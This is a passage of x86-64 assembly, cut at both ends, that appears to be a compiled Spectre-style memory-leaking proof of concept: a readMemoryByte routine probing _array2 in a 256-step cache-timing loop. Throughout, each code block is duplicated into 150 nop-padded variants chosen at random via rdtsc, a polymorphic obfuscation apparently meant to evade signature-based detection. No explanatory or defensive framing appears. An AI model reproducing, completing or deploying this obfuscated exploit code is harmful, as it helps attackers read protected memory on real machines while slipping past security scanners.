	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 110
.LreadMemoryByte_win8_var110:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 111
.LreadMemoryByte_win8_var111:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 112
.LreadMemoryByte_win8_var112:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 113
.LreadMemoryByte_win8_var113:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 114
.LreadMemoryByte_win8_var114:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 115
.LreadMemoryByte_win8_var115:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 116
.LreadMemoryByte_win8_var116:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 117
.LreadMemoryByte_win8_var117:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 118
.LreadMemoryByte_win8_var118:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 119
.LreadMemoryByte_win8_var119:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 120
.LreadMemoryByte_win8_var120:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 121
.LreadMemoryByte_win8_var121:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 122
.LreadMemoryByte_win8_var122:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 123
.LreadMemoryByte_win8_var123:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 124
.LreadMemoryByte_win8_var124:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 125
.LreadMemoryByte_win8_var125:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 126
.LreadMemoryByte_win8_var126:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 127
.LreadMemoryByte_win8_var127:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 128
.LreadMemoryByte_win8_var128:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 129
.LreadMemoryByte_win8_var129:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 130
.LreadMemoryByte_win8_var130:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 131
.LreadMemoryByte_win8_var131:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 132
.LreadMemoryByte_win8_var132:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 133
.LreadMemoryByte_win8_var133:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 134
.LreadMemoryByte_win8_var134:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 135
.LreadMemoryByte_win8_var135:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 136
.LreadMemoryByte_win8_var136:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 137
.LreadMemoryByte_win8_var137:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 138
.LreadMemoryByte_win8_var138:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 139
.LreadMemoryByte_win8_var139:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 140
.LreadMemoryByte_win8_var140:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 141
.LreadMemoryByte_win8_var141:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 142
.LreadMemoryByte_win8_var142:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 143
.LreadMemoryByte_win8_var143:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 144
.LreadMemoryByte_win8_var144:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	nop
	jmp	.LreadMemoryByte_win8_continue
## Variant 145
.LreadMemoryByte_win8_var145:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 146
.LreadMemoryByte_win8_var146:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 147
.LreadMemoryByte_win8_var147:
	popq	%rax
	cmpl	$0, -52(%rbp)
	nop
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 148
.LreadMemoryByte_win8_var148:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 149
.LreadMemoryByte_win8_var149:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
.LreadMemoryByte_win8_continue:
LBB1_7:                                 ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win7_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win7_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win7_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win7_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win7_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win7_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win7_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win7_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win7_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win7_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win7_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win7_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win7_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win7_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win7_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win7_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win7_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win7_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win7_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win7_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win7_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win7_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win7_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win7_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win7_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win7_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win7_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win7_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win7_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win7_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win7_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win7_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win7_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win7_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win7_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win7_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win7_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win7_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win7_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win7_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win7_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win7_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win7_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win7_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win7_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win7_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win7_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win7_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win7_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win7_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win7_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win7_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win7_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win7_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win7_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win7_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win7_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win7_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win7_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win7_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win7_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win7_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win7_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win7_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win7_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win7_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win7_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win7_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win7_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win7_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win7_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win7_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win7_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win7_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win7_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win7_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win7_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win7_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win7_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win7_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win7_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win7_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win7_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win7_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win7_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win7_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win7_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win7_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win7_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win7_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win7_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win7_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win7_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win7_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win7_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win7_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win7_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win7_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win7_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win7_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win7_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win7_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win7_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win7_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win7_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win7_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win7_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win7_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win7_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win7_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win7_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win7_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win7_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win7_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win7_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win7_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win7_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win7_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win7_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win7_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win7_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win7_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win7_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win7_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win7_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win7_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win7_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win7_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win7_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win7_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win7_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win7_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win7_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win7_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win7_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win7_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win7_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win7_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win7_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win7_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win7_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win7_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win7_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win7_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win7_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win7_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win7_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win7_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win7_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win7_var149
	jmp	.LreadMemoryByte_win7_var0
## Variant 0
.LreadMemoryByte_win7_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 1
.LreadMemoryByte_win7_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 2
.LreadMemoryByte_win7_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 3
.LreadMemoryByte_win7_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 4
.LreadMemoryByte_win7_var4:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 5
.LreadMemoryByte_win7_var5:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 6
.LreadMemoryByte_win7_var6:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 7
.LreadMemoryByte_win7_var7:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 8
.LreadMemoryByte_win7_var8:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 9
.LreadMemoryByte_win7_var9:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 10
.LreadMemoryByte_win7_var10:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 11
.LreadMemoryByte_win7_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 12
.LreadMemoryByte_win7_var12:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 13
.LreadMemoryByte_win7_var13:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 14
.LreadMemoryByte_win7_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 15
.LreadMemoryByte_win7_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
	nop
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 16
.LreadMemoryByte_win7_var16:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 17
.LreadMemoryByte_win7_var17:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	nop
	shll	$9, %eax
	movslq	%eax, %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 18
.LreadMemoryByte_win7_var18:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win7_continue
## Variant 19
.LreadMemoryByte_win7_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	movl	-56(%rbp), %eax
	shll	$9, %eax
	nop
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 20
.LreadMemoryByte_win7_var20:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_10
## %bb.8:                               ##   in Loop: Header=BB1_7 Depth=2
	nop
	movl	-56(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	jmp	.LreadMemoryByte_win7_continue
## Variant 21
.LreadMemoryByte_win7_var21:
	popq	%rax
